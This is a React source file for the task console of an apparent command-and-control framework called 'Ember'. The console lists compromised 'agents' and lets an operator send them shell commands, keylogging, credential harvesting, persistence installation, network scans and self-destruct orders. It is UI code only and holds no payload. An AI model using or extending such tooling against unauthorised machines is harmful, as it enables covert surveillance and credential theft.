import { useState, useMemo } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger, DialogFooter } from "@/components/ui/dialog";
import {
  Terminal, Send, ChevronLeft, Cpu, Clock, CheckCircle2,
  XCircle, Loader2, AlertTriangle, Eye, Play, RefreshCw,
  Flame, Search, Filter
} from "lucide-react";
import { Link, useSearch } from "wouter";

const TASK_TYPE_OPTIONS = [
  { value: "shell_command", label: "Shell Command" },
  { value: "file_download", label: "File Download" },
  { value: "file_upload", label: "File Upload" },
  { value: "screenshot", label: "Screenshot" },
  { value: "keylog_start", label: "Start Keylogger" },
  { value: "keylog_stop", label: "Stop Keylogger" },
  { value: "process_list", label: "List Processes" },
  { value: "credential_harvest", label: "Harvest Credentials" },
  { value: "network_scan", label: "Network Scan" },
  { value: "persist_install", label: "Install Persistence" },
  { value: "sleep_update", label: "Update Sleep Timer" },
  { value: "self_destruct", label: "Self Destruct" },
];

const STATUS_COLORS: Record<string, string> = {
  pending: "bg-blue-500/20 text-blue-400 border-blue-500/30",
  dispatched: "bg-amber-500/20 text-amber-400 border-amber-500/30",
  running: "bg-cyan-500/20 text-cyan-400 border-cyan-500/30",
  success: "bg-emerald-500/20 text-emerald-400 border-emerald-500/30",
  failed: "bg-red-500/20 text-red-400 border-red-500/30",
  timeout: "bg-orange-500/20 text-orange-400 border-orange-500/30",
  cancelled: "bg-zinc-500/20 text-zinc-400 border-zinc-500/30",
};

const STATUS_ICONS: Record<string, React.ReactNode> = {
  pending: <Clock className="w-3.5 h-3.5" />,
  dispatched: <Send className="w-3.5 h-3.5" />,
  running: <Loader2 className="w-3.5 h-3.5 animate-spin" />,
  success: <CheckCircle2 className="w-3.5 h-3.5" />,
  failed: <XCircle className="w-3.5 h-3.5" />,
  timeout: <AlertTriangle className="w-3.5 h-3.5" />,
  cancelled: <XCircle className="w-3.5 h-3.5" />,
};

export default function EmberTaskConsole() {
  const searchParams = useSearch();
  const urlParams = new URLSearchParams(searchParams);
  const preselectedAgent = urlParams.get("agent") || "";

  const [selectedAgent, setSelectedAgent] = useState(preselectedAgent);
  const [taskType, setTaskType] = useState("shell_command");
  const [command, setCommand] = useState("");
  const [taskParams, setTaskParams] = useState("{}");
  const [showNewTask, setShowNewTask] = useState(false);
  const [selectedTask, setSelectedTask] = useState<any>(null);
  const [statusFilter, setStatusFilter] = useState("all");

  const agentsQuery = trpc.ember.listAgents.useQuery({ state: "active" as any, limit: 100 }, { refetchInterval: 10000 });
  const agentDetailQuery = trpc.ember.getAgentDetail.useQuery(
    { agentId: selectedAgent },
    { enabled: !!selectedAgent, refetchInterval: 5000 }
  );

  const issueTask = trpc.ember.issueTask.useMutation({
    onSuccess: () => {
      toast.success("Task issued successfully");
      setShowNewTask(false);
      setCommand("");
      agentDetailQuery.refetch();
    },
    onError: (e) => toast.error(`Task failed: ${e.message}`),
  });

  const agents = agentsQuery.data || [];
  const detail = agentDetailQuery.data;
  const tasks = detail?.tasks || [];

  const filteredTasks = useMemo(() => {
    if (statusFilter === "all") return tasks;
    return tasks.filter((t: any) => t.status === statusFilter);
  }, [tasks, statusFilter]);

  const handleIssueTask = () => {
    if (!selectedAgent) {
      toast.error("Select an agent first");
      return;
    }
    let params: any = {};
    if (taskType === "shell_command") {
      params = { command };
    } else {
      try {
        params = JSON.parse(taskParams);
      } catch {
        toast.error("Invalid JSON parameters");
        return;
      }
    }
    issueTask.mutate({
      agentId: selectedAgent,
      type: taskType,
      params,
    });
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <Link href="/ember">
            <Button variant="ghost" size="icon" className="h-8 w-8">
              <ChevronLeft className="w-4 h-4" />
            </Button>
          </Link>
          <div className="p-2 rounded-lg bg-gradient-to-br from-amber-500/20 to-orange-600/20 border border-amber-500/30">
            <Terminal className="w-5 h-5 text-amber-400" />
          </div>
          <div>
            <h1 className="text-xl font-bold tracking-tight">Task Console</h1>
            <p className="text-sm text-muted-foreground">Issue commands and manage agent tasks</p>
          </div>
        </div>
        <div className="flex items-center gap-2">
          <Button
            onClick={() => setShowNewTask(true)}
            disabled={!selectedAgent}
            className="bg-amber-600 hover:bg-amber-700 text-white"
          >
            <Send className="w-4 h-4 mr-2" /> New Task
          </Button>
          <Button variant="outline" size="icon" onClick={() => agentDetailQuery.refetch()}>
            <RefreshCw className="w-4 h-4" />
          </Button>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-4 gap-4">
        {/* Agent Selector */}
        <Card className="bg-card/50 border-border/50 lg:col-span-1">
          <CardHeader className="pb-3">
            <CardTitle className="text-sm">Select Agent</CardTitle>
          </CardHeader>
          <CardContent className="space-y-2 max-h-[600px] overflow-y-auto">
            {agents.length === 0 ? (
              <p className="text-xs text-muted-foreground text-center py-4">No active agents</p>
            ) : (
              agents.map((agent: any) => (
                <button
                  key={agent.agentId}
                  onClick={() => setSelectedAgent(agent.agentId)}
                  className={`w-full text-left p-3 rounded-lg border transition-colors ${
                    selectedAgent === agent.agentId
                      ? "border-amber-500/50 bg-amber-500/10"
                      : "border-border/30 bg-muted/20 hover:border-border/60"
                  }`}
                >
                  <div className="flex items-center gap-2">
                    <div className={`w-2 h-2 rounded-full ${agent.state === "active" ? "bg-emerald-400 animate-pulse" : "bg-amber-400"}`} />
                    <span className="text-xs font-mono font-medium text-foreground truncate">
                      {agent.name || agent.agentId.slice(0, 12)}
                    </span>
                  </div>
                  <div className="flex items-center gap-2 mt-1 text-[10px] text-muted-foreground">
                    <Cpu className="w-3 h-3" />
                    <span>{agent.hostname || "Unknown"}</span>
                    <Badge variant="outline" className="text-[9px] h-4">{agent.profile}</Badge>
                  </div>
                </button>
              ))
            )}
          </CardContent>
        </Card>

        {/* Task History */}
        <div className="lg:col-span-3 space-y-4">
          {selectedAgent && detail ? (
            <>
              {/* Agent Info Bar */}
              <Card className="bg-card/30 border-border/30">
                <CardContent className="p-3 flex items-center justify-between">
                  <div className="flex items-center gap-4 text-sm">
                    <div className="flex items-center gap-2">
                      <Flame className="w-4 h-4 text-amber-400" />
                      <span className="font-mono font-medium text-foreground">{detail.agent.name}</span>
                    </div>
                    <Badge variant="outline" className="text-[10px]">{detail.agent.state}</Badge>
                    <span className="text-xs text-muted-foreground">{detail.agent.hostname} / {detail.agent.externalIp || "—"}</span>
                  </div>
                  <div className="flex items-center gap-2 text-xs text-muted-foreground">
                    <Clock className="w-3 h-3" />
                    Last seen: {detail.agent.lastSeen ? new Date(detail.agent.lastSeen).toLocaleTimeString() : "Never"}
                  </div>
                </CardContent>
              </Card>

              {/* Filter Bar */}
              <div className="flex items-center gap-2">
                <Select value={statusFilter} onValueChange={setStatusFilter}>
                  <SelectTrigger className="w-40">
                    <SelectValue placeholder="Filter" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="all">All Tasks</SelectItem>
                    <SelectItem value="pending">Pending</SelectItem>
                    <SelectItem value="running">Running</SelectItem>
                    <SelectItem value="success">Success</SelectItem>
                    <SelectItem value="failed">Failed</SelectItem>
                  </SelectContent>
                </Select>
                <span className="text-xs text-muted-foreground">{filteredTasks.length} tasks</span>
              </div>

              {/* Task List */}
              <div className="space-y-2">
                {filteredTasks.length === 0 ? (
                  <Card className="bg-card/30 border-border/30">
                    <CardContent className="p-8 text-center">
                      <Terminal className="w-10 h-10 text-muted-foreground/30 mx-auto mb-3" />
                      <p className="text-sm text-muted-foreground">No tasks yet. Issue a command to get started.</p>
                    </CardContent>
                  </Card>
                ) : (
                  filteredTasks.map((task: any) => (
                    <Card
                      key={task.id}
                      className="bg-card/40 border-border/30 hover:border-border/60 transition-colors cursor-pointer"
                      onClick={() => setSelectedTask(task)}
                    >
                      <CardContent className="p-3">
                        <div className="flex items-start justify-between">
                          <div className="flex items-start gap-3">
                            <div className="mt-0.5">
                              {STATUS_ICONS[task.status] || <Clock className="w-3.5 h-3.5" />}
                            </div>
                            <div>
                              <div className="flex items-center gap-2">
                                <span className="text-sm font-medium text-foreground">{task.taskType?.replace(/_/g, " ")}</span>
                                <Badge variant="outline" className={`text-[9px] ${STATUS_COLORS[task.status] || ""}`}>
                                  {task.status}
                                </Badge>
                              </div>
                              {task.taskType === "shell_command" && task.params?.command && (
                                <pre className="text-xs text-muted-foreground font-mono mt-1 truncate max-w-lg">
                                  $ {task.params.command}
                                </pre>
                              )}
                              <div className="flex items-center gap-3 mt-1 text-[10px] text-muted-foreground">
                                <span>ID: {task.taskId?.slice(0, 8)}</span>
                                <span>{task.createdAt ? new Date(task.createdAt).toLocaleString() : ""}</span>
                              </div>
                            </div>
                          </div>
                          <Eye className="w-4 h-4 text-muted-foreground/50" />
                        </div>
                      </CardContent>
                    </Card>
                  ))
                )}
              </div>
            </>
          ) : (
            <Card className="bg-card/30 border-border/30">
              <CardContent className="p-12 text-center">
                <Cpu className="w-12 h-12 text-muted-foreground/20 mx-auto mb-4" />
                <h3 className="text-lg font-semibold text-foreground mb-2">Select an Agent</h3>
                <p className="text-sm text-muted-foreground">Choose an agent from the left panel to view and manage tasks.</p>
              </CardContent>
            </Card>
          )}
        </div>
      </div>

      {/* New Task Dialog */}
      <Dialog open={showNewTask} onOpenChange={setShowNewTask}>
        <DialogContent className="max-w-lg">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Send className="w-4 h-4 text-amber-400" /> Issue Task
            </DialogTitle>
          </DialogHeader>
          <div className="space-y-4">
            <div className="space-y-2">
              <Label>Task Type</Label>
              <Select value={taskType} onValueChange={setTaskType}>
                <SelectTrigger>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {TASK_TYPE_OPTIONS.map((t) => (
                    <SelectItem key={t.value} value={t.value}>{t.label}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            {taskType === "shell_command" ? (
              <div className="space-y-2">
                <Label>Command</Label>
                <div className="flex items-center gap-2 bg-zinc-950 border border-border/30 rounded-lg px-3">
                  <span className="text-emerald-400 font-mono text-sm">$</span>
                  <Input
                    value={command}
                    onChange={(e) => setCommand(e.target.value)}
                    placeholder="whoami"
                    className="border-0 bg-transparent font-mono text-sm text-emerald-400 focus-visible:ring-0 px-0"
                    onKeyDown={(e) => {
                      if (e.key === "Enter" && command) handleIssueTask();
                    }}
                  />
                </div>
              </div>
            ) : (
              <div className="space-y-2">
                <Label>Parameters (JSON)</Label>
                <Textarea
                  value={taskParams}
                  onChange={(e) => setTaskParams(e.target.value)}
                  placeholder='{"key": "value"}'
                  className="font-mono text-sm"
                  rows={4}
                />
              </div>
            )}
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setShowNewTask(false)}>Cancel</Button>
            <Button
              onClick={handleIssueTask}
              disabled={issueTask.isPending || (taskType === "shell_command" && !command)}
              className="bg-amber-600 hover:bg-amber-700 text-white"
            >
              {issueTask.isPending ? <Loader2 className="w-4 h-4 animate-spin mr-2" /> : <Play className="w-4 h-4 mr-2" />}
              Execute
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Task Detail Dialog */}
      <Dialog open={!!selectedTask} onOpenChange={() => setSelectedTask(null)}>
        <DialogContent className="max-w-2xl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              Task Detail
              {selectedTask && (
                <Badge variant="outline" className={`text-[10px] ${STATUS_COLORS[selectedTask.status] || ""}`}>
                  {selectedTask.status}
                </Badge>
              )}
            </DialogTitle>
          </DialogHeader>
          {selectedTask && (
            <div className="space-y-4">
              <div className="grid grid-cols-2 gap-4 text-sm">
                <div>
                  <p className="text-xs text-muted-foreground">Task ID</p>
                  <p className="font-mono text-foreground">{selectedTask.taskId}</p>
                </div>
                <div>
                  <p className="text-xs text-muted-foreground">Type</p>
                  <p className="text-foreground capitalize">{selectedTask.taskType?.replace(/_/g, " ")}</p>
                </div>
                <div>
                  <p className="text-xs text-muted-foreground">Created</p>
                  <p className="text-foreground">{selectedTask.createdAt ? new Date(selectedTask.createdAt).toLocaleString() : "—"}</p>
                </div>
                <div>
                  <p className="text-xs text-muted-foreground">Completed</p>
                  <p className="text-foreground">{selectedTask.completedAt ? new Date(selectedTask.completedAt).toLocaleString() : "—"}</p>
                </div>
              </div>

              {selectedTask.params?.command && (
                <div>
                  <p className="text-xs text-muted-foreground mb-1">Command</p>
                  <pre className="bg-zinc-950 border border-border/30 rounded-lg p-3 text-xs text-emerald-400 font-mono">
                    $ {selectedTask.params.command}
                  </pre>
                </div>
              )}

              {selectedTask.output && (
                <div>
                  <p className="text-xs text-muted-foreground mb-1">Output</p>
                  <pre className="bg-zinc-950 border border-border/30 rounded-lg p-3 text-xs text-foreground font-mono max-h-64 overflow-y-auto whitespace-pre-wrap">
                    {selectedTask.output}
                  </pre>
                </div>
              )}

              {selectedTask.error && (
                <div>
                  <p className="text-xs text-red-400 mb-1">Error</p>
                  <pre className="bg-red-950/30 border border-red-500/30 rounded-lg p-3 text-xs text-red-400 font-mono">
                    {selectedTask.error}
                  </pre>
                </div>
              )}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
